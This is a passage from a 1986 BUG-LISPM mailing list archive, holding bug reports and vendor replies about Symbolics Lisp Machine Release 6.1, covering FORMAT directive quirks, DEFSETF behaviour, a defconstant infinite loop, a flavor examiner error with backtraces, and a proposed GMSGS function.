       Arg 1 (ZWEI:CHAR): 344
       Arg 2 (ZWEI:PREFIX-CHAR): NIL
       Arg 3 (ZWEI:HOOK-LIST): NIL

    ZWEI:PROCESS-COMMAND-CHAR:  (P.C. = 14)
       Arg 0 (ZWEI:CH): 344

    (:METHOD ZWEI:EDITOR :EDIT):  (P.C. = 233)
       Arg 0 (SELF): #<ZMACS-TOP-LEVEL-EDITOR 144776776>
       Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:EDITOR -- 12. IV's, 0. FL's 120377766>
       Arg 2 (SI:OPERATION): :EDIT
       --Defaulted args:--
       Arg 3 (ZWEI:TOP-LEVEL-P): T
       Arg 4 (ZWEI:DESCRIPTION): NIL

    (:METHOD ZWEI:TOP-LEVEL-EDITOR :COMBINED :EDIT):  (P.C. = 60)
       Arg 0 (SELF): #<ZMACS-TOP-LEVEL-EDITOR 144776776>
       Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:TOP-LEVEL-EDITOR -- 13. IV's, 1. FL's 120377366>
       Arg 2 (SI:.OPERATION.): :EDIT
       Rest arg (SI:.DAEMON-CALLER-ARGS.): NIL

    ZWEI:ZMACS-WINDOW-TOP-LEVEL:  (P.C. = 51)

    SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
       Arg 0 (IGNORE): NIL

27-Mar-86 09:38:00-EST,1233;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 27 Mar 86 09:37-EST
Received: from SCRC-STONY-BROOK.ARPA by MC.LCS.MIT.EDU 27 Mar 86 09:39:51 EST
Received: from THAMES.SCRC.Symbolics.COM by SCRC-STONY-BROOK.ARPA via CHAOS with CHAOS-MAIL id 448108; Thu 27-Mar-86 09:26:42-EST
Date: Thu, 27 Mar 86 09:30 EST
From: Scott McKay <SWM@SCRC-QUABBIN.ARPA>
Subject: ~t with 0 arg broken
To: Zvona@OZ.AI.MIT.EDU, BUG-LISPM@OZ.AI.MIT.EDU
In-Reply-To: <860324163913.2.ZVONA@JANIS.AI.MIT.EDU>
Message-ID: <860327093057.4.SWM@THAMES.SCRC.Symbolics.COM>

    Date: Mon, 24 Mar 86 16:39 EST
    From: David Chapman <Zvona@OZ.AI.MIT.EDU>

    In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.12,
    AISite 14.1, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
    Experimental CGL 34.0, microcode TMC5-COL-MIC 353, FEP 127,
    FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
    FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Janis Joplin:

    (format t "~&~0tFOO") types a space before the FOO.

    Obviously, you would not write such a format string, but

    (format t "~&~vt~s" foo bar)

    where foo => 0 is plausible.

This gets me all the time.  Try ~0:T instead.

27-Mar-86 13:11:30-EST,2086;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 27 Mar 86 13:11-EST
Received: from OTIS.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 27245; Thu 27-Mar-86 13:12:32-EST
Date: Thu, 27 Mar 86 13:12 EST
From: Chris Lindblad <CJL@OZ.AI.MIT.EDU>
Subject: Zmail GMSGS doesn't work on TOPS-20 hosts
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860327131214.3.CJL@OTIS.AI.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.12,
AISite 14.1, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>V127-LISP.FLOD(2),
FEP0:>V127-LOADERS.FLOD(3), FEP0:>V127-INFO.FLOD(2),
FEP0:>V127-DEBUG.FLOD(1), on Lisp Machine Otis Redding:

Zmail GMSGS doesn't work on TOPS-20 hosts, or at least not on OZ. The
host expected a contact name with a username in it, and it protocol is a
simple protocol, not a stream protocol.

This is my suggested GMSGS function:

(DEFUN GMSGS (&OPTIONAL HOST (STREAM STANDARD-OUTPUT) BARF-P)
  (COND ((NULL HOST)
	 (SETQ HOST (SECOND (SEND SI:*USER* ':MAIL-ADDRESS))))
	((STRINGP HOST)
	 (SETQ HOST (SI:PARSE-HOST HOST))))
  (CONDITION-CASE (ERROR)
      (SELECTQ (SEND HOST ':SYSTEM-TYPE)
	(:TOPS-20 
	 (FORMAT QUERY-IO "~&Gmsgs: ~A~%"
		 (CHAOS:PKT-STRING
		   (CHAOS:SIMPLE HOST (FORMAT NIL "GMSGS ~A ~A"
					      (CAR (SEND SI:*USER* :MAIL-ADDRESS))
					      *GMSGS-OTHER-SWITCHES*)))))
	(:ITS
	 (LET ((FILE-NAME (SEND (FS:USER-HOMEDIR HOST) ':GMSGS-INBOX-PATHNAME)))
	   (WITH-OPEN-STREAM (CSTREAM (CHAOS:OPEN-STREAM
					HOST
					(FORMAT NIL "GMSGS ~A;~A //G~A"
						(CAR (SEND FILE-NAME ':DIRECTORY))
						(SEND FILE-NAME ':NAME)
						*GMSGS-OTHER-SWITCHES*)))
	     (STREAM-COPY-UNTIL-EOF CSTREAM STREAM))
	   FILE-NAME))
	(OTHERWISE
	 (WITH-OPEN-STREAM (CSTREAM (CHAOS:OPEN-STREAM
				      HOST
				      (FORMAT NIL "GMSGS ~A" *GMSGS-OTHER-SWITCHES*)))
	   (STREAM-COPY-UNTIL-EOF CSTREAM STREAM))))
    (SYS:REMOTE-NETWORK-ERROR
      (FUNCALL (IF BARF-P #'BARF #'TYPEIN-LINE)
	       "Error during GMSGS to ~A: ~A" HOST ERROR))))
27-Mar-86 15:30:04-EST,1030;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 27 Mar 86 15:30-EST
Date: Thu, 27 Mar 86 15:29:59 EST
From: David Vinayak Wallace <GUMBY@MC.LCS.MIT.EDU>
Subject:  ~t with 0 arg broken
To: SWM@SCRC-QUABBIN.ARPA
cc: BUG-LISPM@OZ.AI.MIT.EDU, Zvona@OZ.AI.MIT.EDU
In-reply-to: Msg of Thu 27 Mar 86 09:30 EST from Scott McKay <SWM at SCRC-QUABBIN.ARPA>
Message-ID: <[MC.LCS.MIT.EDU].863761.860327.GUMBY>

    Date: Thu, 27 Mar 86 09:30 EST
    From: Scott McKay <SWM at SCRC-QUABBIN.ARPA>

        Date: Mon, 24 Mar 86 16:39 EST
        From: David Chapman <Zvona@OZ.AI.MIT.EDU>

        (format t "~&~0tFOO") types a space before the FOO.

        Obviously, you would not write such a format string, but

        (format t "~&~vt~s" foo bar)

        where foo => 0 is plausible.

    This gets me all the time.  Try ~0:T instead.

Foo. ":T" isn't CL and isn't transportable.  It's behaviour isn't
defined for files (how many pixels wide is a file?)  The documented
way to do this is "~v,0t."
27-Mar-86 22:57:34-EST,659;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 27 Mar 86 22:57-EST
Date: Thu, 27 Mar 86 17:02:53 EST
From: "Thomas A. Russ" <TAR@MC.LCS.MIT.EDU>
Subject: CL Format Bug   ~F.
To: BUG-LISPM@MC.LCS.MIT.EDU
Message-ID: <[MC.LCS.MIT.EDU].863844.860327.TAR>


Release 6.1


There is a bug in the Common Lisp format for ~F format.  It
appears when printing a floating point zero in a field of
a width larger than necessary.

For example:

	(format nil "~7F" 0.0)		==>	"   0.00"

instead of producing "    0.0"
This is not a problem with larger numbers such as

	(format nil "~7F" 1.0)		==>	"    1.0"

which is correct.

Tom.
28-Mar-86 11:35:15-EST,971;000000000000
Received: from CROSBY.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 28 Mar 86 11:35-EST
Date: Fri, 28 Mar 86 11:35 EST
From: Richard C. Waters <DICK@OZ.AI.MIT.EDU>
Subject: bug in defconstant
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <"860328113551.1.DICK@OZ"@CROSBY.AI.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.12,
AISite 14.1, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine Bing Crosby:


If you compile the defconstant below twice it will go into an infinite loop
the second time presumably because although the values are the same both times,
they are infinite lists.

(defmacro make-template (head rest)
  `(let ((h (append ',head nil))
	 (r (append ',rest nil)))
     (nconc h r r)))

(defconstant *expr-template* (make-template (Q) (E)))



					Dick Waters
28-Mar-86 11:45:42-EST,886;000000000000
Received: from CROSBY.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 28 Mar 86 11:45-EST
Date: Fri, 28 Mar 86 11:46 EST
From: Richard C. Waters <DICK@OZ.AI.MIT.EDU>
Subject: bug in define-setf-method
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <"860328114605.2.DICK@OZ"@CROSBY.AI.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.12,
AISite 14.1, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine Bing Crosby:



If you do a defsetf
and then you do a define-setf-method,

the defsetf stays in effect overriding the define-setf-method,
because different properties are used and setf looks for a trivial
setf method first.  Define-setf-method should get rid of any trivial properties!

			Dick Waters
28-Mar-86 14:32:08-EST,691;000000000000
Received: from XX.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 28 Mar 86 14:31-EST
Date: Fri 28 Mar 86 14:33:32-EST
From: Ken Traub <KT@XX.LCS.MIT.EDU>
Subject: DEFSETF bug
To: bug-lispm@OZ.AI.MIT.EDU
Message-ID: <12194366084.44.KT@XX.LCS.MIT.EDU>

While using Common Lisp in Release 6.1:

If you do a trivial DEFSETF, e.g. (DEFSETF FOO BAR), followed by a
complicated one for the same access-fn, e.g. (DEFSETF FOO (ARG1 ARG2) (VAL) . body),
SETF continues to expand to the trivial DEFSETF.  Apparently, the
second DEFSETF doesn't remove the LT::TRIVIAL-SETF-METHOD property
from FOO, and SETF looks for it before looking for a LT::SETF-METHOD
property.

				--- Ken
-------
28-Mar-86 17:28:07-EST,1794;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 28 Mar 86 17:28-EST
Received: from ALLEGHENY.SCRC.Symbolics.COM by MC.LCS.MIT.EDU 28 Mar 86 17:29:45 EST
Received: from FIREBIRD.SCRC.Symbolics.COM by ALLEGHENY.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 10198; Fri 28-Mar-86 17:26:09-EST
Date: Fri, 28 Mar 86 17:26 EST
From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>
Subject: bug in defconstant
To: Richard C. Waters <DICK@OZ.AI.MIT.EDU>, BUG-LISPM@OZ.AI.MIT.EDU
In-Reply-To: <"860328113551.1.DICK@OZ"@CROSBY.AI.MIT.EDU>
Message-ID: <860328172625.5.DCP@FIREBIRD.SCRC.Symbolics.COM>

    Date: Fri, 28 Mar 86 11:35 EST
    From: Richard C. Waters <DICK@OZ.AI.MIT.EDU>

    In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.12,
    AISite 14.1, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
    microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(2),
    FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
    FEP0:>v127-info.flod(2), on Lisp Machine Bing Crosby:


    If you compile the defconstant below twice it will go into an infinite loop
    the second time presumably because although the values are the same both times,
    they are infinite lists.

    (defmacro make-template (head rest)
      `(let ((h (append ',head nil))
	     (r (append ',rest nil)))
	 (nconc h r r)))

    (defconstant *expr-template* (make-template (Q) (E)))

You only have to compile it once in Release 7 to get it to go into an
infinite loop.  Inifinite loop bugs are best reported by doing
c-m-Suspend followed by c-M.  In Release 7 this will loop in LAST called
from COPYLIST called from COPYTREE-AND-LEAVES, etc.  In Release 6, I'm
guessing it is trying to do EQUAL with the previous version to see if it
should generate a warning.

29-Mar-86 03:51:55-EST,1933;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 29 Mar 86 03:51-EST
Received: from SAPSUCKER.SCRC.Symbolics.COM by MC.LCS.MIT.EDU 29 Mar 86 03:44:12 EST
Date: Sat, 29 Mar 86 03:41 EST
From: hornig@SCRC-QUABBIN.ARPA
Sender: File-Server@SCRC-QUABBIN.ARPA
Subject: bug in define-setf-method
To: DICK%OZ.AI.MIT.EDU@MIT-MC.ARPA, BUG-LISPM%OZ.AI.MIT.EDU@MIT-MC.ARPA
In-Reply-To: <"860328114605.2.DICK@OZ"@CROSBY.AI.MIT.EDU>
Message-ID: <860329034144.1.FILE-SERVER@SAPSUCKER.SCRC.Symbolics.COM>

    Received: from SCRC-STONY-BROOK.ARPA by SCRC-RIVERSIDE.ARPA via CHAOS with CHAOS-MAIL id 81211; Fri 28-Mar-86 20:02:30-EST
    Received: from XX.LCS.MIT.EDU (MIT-XX.ARPA) by SCRC-STONY-BROOK.ARPA via INTERNET with SMTP id 449542; 28 Mar 86 14:25:59-EST
    Received: from OZ.AI.MIT.EDU by XX.LCS.MIT.EDU via Chaosnet; 28 Mar 86 12:34-EST
    Received: from CROSBY.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 28 Mar 86 11:45-EST
    Date: Fri, 28 Mar 86 11:46 EST
    From: Richard C. Waters <DICK@OZ.AI.MIT.EDU>
    Subject: bug in define-setf-method
    To: BUG-LISPM@OZ.AI.MIT.EDU
    Message-ID: <"860328114605.2.DICK@OZ"@CROSBY.AI.MIT.EDU>

    In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.12,
    AISite 14.1, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
    microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(2),
    FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
    FEP0:>v127-info.flod(2), on Lisp Machine Bing Crosby:

    If you do a defsetf
    and then you do a define-setf-method,

    the defsetf stays in effect overriding the define-setf-method,
    because different properties are used and setf looks for a trivial
    setf method first.  Define-setf-method should get rid of any trivial properties!

			    Dick Waters

Thank you for this report.  The problem you describe has been fixed and the fix will be distributed in a future release.

29-Mar-86 03:52:41-EST,1620;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 29 Mar 86 03:52-EST
Received: from SAPSUCKER.SCRC.Symbolics.COM by MC.LCS.MIT.EDU 29 Mar 86 03:45:01 EST
Date: Sat, 29 Mar 86 03:42 EST
From: hornig@SCRC-QUABBIN.ARPA
Sender: File-Server@SCRC-QUABBIN.ARPA
Subject: DEFSETF bug
To: KT%XX.LCS.MIT.EDU@MIT-MC.ARPA, bug-lispm%OZ.AI.MIT.EDU@MIT-MC.ARPA
In-Reply-To: <12194366084.44.KT@XX.LCS.MIT.EDU>
Message-ID: <860329034242.3.FILE-SERVER@SAPSUCKER.SCRC.Symbolics.COM>

    Received: from SCRC-STONY-BROOK.ARPA by SCRC-RIVERSIDE.ARPA via CHAOS with CHAOS-MAIL id 81152; Fri 28-Mar-86 18:09:11-EST
    Received: from OZ.AI.MIT.EDU (MIT-MC.ARPA) by SCRC-STONY-BROOK.ARPA via INTERNET with SMTP id 449589; 28 Mar 86 14:56:10-EST
    Received: from XX.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 28 Mar 86 14:31-EST
    Date: Fri 28 Mar 86 14:33:32-EST
    From: Ken Traub <KT@XX.LCS.MIT.EDU>
    Subject: DEFSETF bug
    To: bug-lispm@OZ.AI.MIT.EDU
    Message-ID: <12194366084.44.KT@XX.LCS.MIT.EDU>

    While using Common Lisp in Release 6.1:

    If you do a trivial DEFSETF, e.g. (DEFSETF FOO BAR), followed by a
    complicated one for the same access-fn, e.g. (DEFSETF FOO (ARG1 ARG2) (VAL) . body),
    SETF continues to expand to the trivial DEFSETF.  Apparently, the
    second DEFSETF doesn't remove the LT::TRIVIAL-SETF-METHOD property
    from FOO, and SETF looks for it before looking for a LT::SETF-METHOD
    property.

				    --- Ken
    -------
Thank you for this report.  The problem you describe has been fixed and the fix will be distributed in a future release.

29-Mar-86 04:54:55-EST,5149;000000000000
Received: from MORRISON.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 29 Mar 86 04:54-EST
Date: Sat, 29 Mar 86 04:53 EST
From: David M. J. Saslav <saz@OZ.AI.MIT.EDU>
Subject: bug in flavor examiner
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860329045332.1.SAZ@MIT-MORRISON.ARPA>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.12,
AISite 14.1, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

left-click on "Local Methods" for the flavor TV:ESSENTIAL-WINDOW-WITH-SENSITIVE-ITEMS
after a left-click on the flavor-name itself, in the top-left pane.  This occurs
only on the first time click after booting.  Aborting from this error and trying it
again, I find, works without error.

>>Error: :OVERRIDE :WHO-LINE-DOCUMENTATION-STRING method(s) illegal when using :DAEMON method-combination
While in the function SI:GET-CERTAIN-METHODS  (:METHOD FLAVEX:FLAVOR :DAEMON-DUMMY)  (:METHOD FLAVEX:FLAVOR :COMPUTE-ALL-HANDLERS-ONCE)

SI:GET-CERTAIN-METHODS:  (P.C. = 62)
   Arg 0 (SI:MAGIC-LIST-ENTRY): (:WHO-LINE-DOCUMENTATION-STRING NIL NIL (NIL (:METHOD TV:BASIC-SENSITIVE-ITEM :DEFAULT :WHO-LINE-DOCUMENTATION-STRING)) (:OVERRIDE (:METHOD TV:ESSENTIAL-WINDOW-WITH-SENSITIVE-ITEMS :OVERRIDE :WHO-LINE-DOCUMENTATION-STRING)))
   Arg 1 (SI:METHOD-TYPE): NIL
   Arg 2 (SI:OTHER-METHODS-ALLOWED): (:BEFORE :AFTER)
   Arg 3 (SI:NO-METHODS-OK): T
   Arg 4 (SI:ORDERING-DECLARATION): :BASE-FLAVOR-LAST
   --Defaulted args:--
   Arg 5 (SI:OTHER-METHOD-TYPE): NIL
   Arg 6 (SI:FL): NIL
   Local 7 (SI:METHODS): ((:METHOD TV:BASIC-SENSITIVE-ITEM :DEFAULT :WHO-LINE-DOCUMENTATION-STRING))
   Local 8 (SI:MORE-METHODS): NIL
   Local 9: ((:OVERRIDE (:METHOD TV:ESSENTIAL-WINDOW-WITH-SENSITIVE-ITEMS :OVERRIDE :WHO-LINE-DOCUMENTATION-STRING)))
   Local 10 (SI:X): (:OVERRIDE (:METHOD TV:ESSENTIAL-WINDOW-WITH-SENSITIVE-ITEMS :OVERRIDE :WHO-LINE-DOCUMENTATION-STRING))

(:METHOD FLAVEX:FLAVOR :DAEMON-DUMMY):  (P.C. = 13)
   Arg 0 (SELF): #<FLAVOR (TV:ESSENTIAL-WINDOW-WITH-SENSITIVE-ITEMS) 13240144>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FLAVEX:FLAVOR -- 16. IV's, 0. FL's 120345413>
   Arg 2 (SI:OPERATION): :DAEMON-DUMMY
   Arg 3 (FLAVEX:COMBINATION-TYPE): :DAEMON
   Arg 4 (FLAVEX:MLE): (:WHO-LINE-DOCUMENTATION-STRING NIL NIL (NIL (:METHOD TV:BASIC-SENSITIVE-ITEM :DEFAULT :WHO-LINE-DOCUMENTATION-STRING)) (:OVERRIDE (:METHOD TV:ESSENTIAL-WINDOW-WITH-SENSITIVE-ITEMS :OVERRIDE :WHO-LINE-DOCUMENTATION-STRING)))

(:METHOD FLAVEX:FLAVOR :COMPUTE-ALL-HANDLERS-ONCE):  (P.C. = 47)
   Arg 0 (SELF): #<FLAVOR (TV:ESSENTIAL-WINDOW-WITH-SENSITIVE-ITEMS) 13240144>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FLAVEX:FLAVOR -- 16. IV's, 0. FL's 120345413>
   Arg 2 (SI:OPERATION): :COMPUTE-ALL-HANDLERS-ONCE
   --Defaulted args:--
   Arg 3 (FLAVEX:FORCE?): NIL

(:METHOD FLAVEX:FLAVOR :COMPUTE-LOCAL-METHODS-ONCE):  (P.C. = 4)
   Arg 0 (SELF): #<FLAVOR (TV:ESSENTIAL-WINDOW-WITH-SENSITIVE-ITEMS) 13240144>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FLAVEX:FLAVOR -- 16. IV's, 0. FL's 120345413>
   Arg 2 (SI:OPERATION): :COMPUTE-LOCAL-METHODS-ONCE

(:METHOD FLAVEX:FLAVOR :GET-LOCAL-METHODS):  (P.C. = 4)
   Arg 0 (SELF): #<FLAVOR (TV:ESSENTIAL-WINDOW-WITH-SENSITIVE-ITEMS) 13240144>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FLAVEX:FLAVOR -- 16. IV's, 0. FL's 120345413>
   Arg 2 (SI:OPERATION): :GET-LOCAL-METHODS

(:METHOD FLAVEX:FRAME :GET-LOCAL-METHODS):  (P.C. = 4)
   Arg 0 (SELF): #<FRAME Flavor Examiner 1 43201111 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FLAVEX:FRAME -- 21. IV's, 12. FL's 120345306>
   Arg 2 (SI:OPERATION): :GET-LOCAL-METHODS
   Arg 3 (FLAVEX:FLAVOR): #<FLAVOR (TV:ESSENTIAL-WINDOW-WITH-SENSITIVE-ITEMS) 13240144>

(:METHOD FLAVEX:FRAME :FLAVOR-LEFT-CLICK-MENU):  (P.C. = 17)
   Arg 0 (SELF): #<FRAME Flavor Examiner 1 43201111 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FLAVEX:FRAME -- 21. IV's, 12. FL's 120345306>
   Arg 2 (SI:OPERATION): :FLAVOR-LEFT-CLICK-MENU
   Arg 3 (FLAVEX:FLAVOR): #<FLAVOR (TV:ESSENTIAL-WINDOW-WITH-SENSITIVE-ITEMS) 13240144>

SEND:  (P.C. = 6)
   Arg 0 (SI:OBJECT): #<FRAME Flavor Examiner 1 43201111 exposed>
   Arg 1 (SI:MESSAGE-NAME): :FLAVOR-LEFT-CLICK-MENU
   Rest arg (SI:ARGUMENTS): (#<FLAVOR (TV:ESSENTIAL-WINDOW-WITH-SENSITIVE-ITEMS) 13240144>)

SI:*EVAL:  (P.C. = 401)
   Arg 0 (SI:FORM): (SEND (QUOTE #<FRAME Flavor Examiner 1 43201111 exposed>) (QUOTE :FLAVOR-LEFT-CLICK-MENU) (QUOTE #<FLAVOR (TV:ESSENTIAL-WINDOW-WITH-SENSITIVE-ITEMS) 13240144>))
   Local 0 (SI:FORM): NIL
   --Defaulted args:--
   Arg 1 (SI:ENV): NIL
   Arg 2 (SI:HOOK): NIL

(:METHOD FLAVEX:ITEM :HANDLE-CLICK):  (P.C. = 32)
   Arg 0 (SELF): #<ITEM 13240214>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FLAVEX:ITEM -- 7. IV's, 0. FL's 120104631>
   Arg 2 (SI:OPERATION): :HANDLE-CLICK

FLAVEX:FRAME-FUNCTION:  (P.C. = 305)
   Arg 0 (FLAVEX:FRAME): #<FRAME Flavor Examiner 1 43201111 exposed>
29-Mar-86 05:57:40-EST,1641;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 29 Mar 86 05:57-EST
Received: from MCC.ARPA by MC.LCS.MIT.EDU 29 Mar 86 05:57:21 EST
Received: from SCRC-STONY-BROOK.ARPA by MCC.ARPA with TCP; Sat 29 Mar 86 04:55:01-CST
Received: from PEACE.SCRC.Symbolics.COM by SCRC-STONY-BROOK.ARPA via CHAOS with CHAOS-MAIL id 450110; Sat 29-Mar-86 05:52:10-EST
Date: Sat, 29 Mar 86 05:54 EST
From: Charles Hornig <Hornig@SCRC-RIVERSIDE.ARPA>
Subject: ASSERT
To: David Vinayak Wallace <Gumby@MCC.ARPA>
cc: BUG-LISPM%mc@MCC.ARPA, Bug-Tracking-Replies@SCRC-RIVERSIDE.ARPA
In-Reply-To: <851011125559.1.GUMBY@INANNA>
Disposition: COMPLETED
Category: cl
Message-ID: <860329055414.4.HORNIG@PEACE.SCRC.Symbolics.COM>

Synopsis:  Thank you for your report.  The problem you describe has been
fixed and will be distributed in a future release.

  -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --

    Date: Fri, 11 Oct 85 12:55 CDT
    From: David Vinayak Wallace <Gumby@MCC-AI>

    In Symbolics 3640 Release 6.0, MCC-Site 3.0, IP-TCP 29.0,
    Experimental CYC-5 2.0, microcode TMC5-IO4-ST506-MIC 319, on Inanna:

    CL:ASSERT has two implementational bugs, arising from its using
    multiple-value-choose menus for its operations:

    First, I can't end my typeing with a carriage-return, which is
    non-intuitive.  I have to end it with a space.

    Secondly, I can only enter symbols this way.  What if I want to use
    ASSERT to require that something be, e.g. a pathname for a particular
    host?  I can do this by typing #. but I have to use ZL, and not CL
    with it(!).


 1-Apr-86 13:03:22-EST,1801;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 1 Apr 86 13:03-EST
Received: from SCRC-STONY-BROOK.ARPA by MC.LCS.MIT.EDU  1 Apr 86 13:03:11 EST
Received: from PETREL.SCRC.Symbolics.COM by SCRC-STONY-BROOK.ARPA via CHAOS with CHAOS-MAIL id 451941; Tue 1-Apr-86 11:10:39-EST
Date: Tue, 1 Apr 86 11:14 EST
From: Richard L. Bryan <RLB@SCRC-QUABBIN.ARPA>
Subject: bug in flavor examiner
To: saz@OZ.AI.MIT.EDU, BUG-LISPM@OZ.AI.MIT.EDU
In-Reply-To: <860329045332.1.SAZ@MIT-MORRISON.ARPA>
Message-ID: <860401111459.0.RLB@PETREL.SCRC.Symbolics.COM>

    Date: Sat, 29 Mar 86 04:53 EST
    From: David M. J. Saslav <saz@OZ.AI.MIT.EDU>

    In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.12,
    AISite 14.1, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
    microcode TMC5-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(2),
    FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
    FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

    left-click on "Local Methods" for the flavor TV:ESSENTIAL-WINDOW-WITH-SENSITIVE-ITEMS
    after a left-click on the flavor-name itself, in the top-left pane.  This occurs
    only on the first time click after booting.  Aborting from this error and trying it
    again, I find, works without error.

    >>Error: :OVERRIDE :WHO-LINE-DOCUMENTATION-STRING method(s) illegal when using :DAEMON method-combination
    While in the function SI:GET-CERTAIN-METHODS  (:METHOD FLAVEX:FLAVOR :DAEMON-DUMMY)  (:METHOD FLAVEX:FLAVOR :COMPUTE-ALL-HANDLERS-ONCE)

I cannot reproduce this in the development system,
perhaps because the flavor examiner has been completely
replaced, along with a certain amount of its flavor
system substrate.  Thanks for the report, anyway.  I
guess I can claim "fixed in a future release".

 1-Apr-86 14:02:46-EST,946;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 1 Apr 86 13:52-EST
Received: from INTERLAKEN.LCS.MIT.EDU by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 29876; Tue 1-Apr-86 13:52:25-EST
Date: Tue, 1 Apr 86 13:51 EST
From: ZiPpY tHe PiNhEaD <Zippy@OZ.AI.MIT.EDU>
Subject: Command completion
To: BUG-LISPM@MIT-ZERMATT.ARPA
Message-ID: <860401135146.2.ZIPPY@INTERLAKEN.LCS.MIT.EDU>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, Macsyma 318.12, PASCAL 31.0,
FORTRAN 49.4, Japanese 24.1, 6-1-Patches 1.12, MLSite 13.0,
Experimental DVI 1.1, microcode TMC5-IO4-MIC 336, FEP 127,
FEP0:>v127-lisp.flod(4), FEP0:>v127-loaders.flod(4),
FEP0:>v127-debug.flod(10), FEP0:>v127-info.flod(4), on Interlaken:

Webster-Dictionary and Webster^s-Dictionary both seem to be facilities
(synonyms?)... but I'm unable to type Enable Facility Webster-Dictionary
(even typing it all out gives me an "ambiguous completion" complaint!).
 1-Apr-86 16:28:25-EST,374;000000000000
Received: from XX.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 1 Apr 86 16:18-EST
Date: Tue 1 Apr 86 16:18:54-EST
From: Ken Traub <KT@XX.LCS.MIT.EDU>
Subject: Minor bug in Rel 6.1 Common Lisp
To: bug-lispm@OZ.AI.MIT.EDU
Message-ID: <12195433841.43.KT@XX.LCS.MIT.EDU>

In Rel 6.1 Common Lisp, WITH-OPEN-STREAM evaluates its string argument
twice.
			--- Ken
-------
 1-Apr-86 16:28:55-EST,463;000000000000
Received: from XX.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 1 Apr 86 16:18-EST
Date: Tue 1 Apr 86 16:20:21-EST
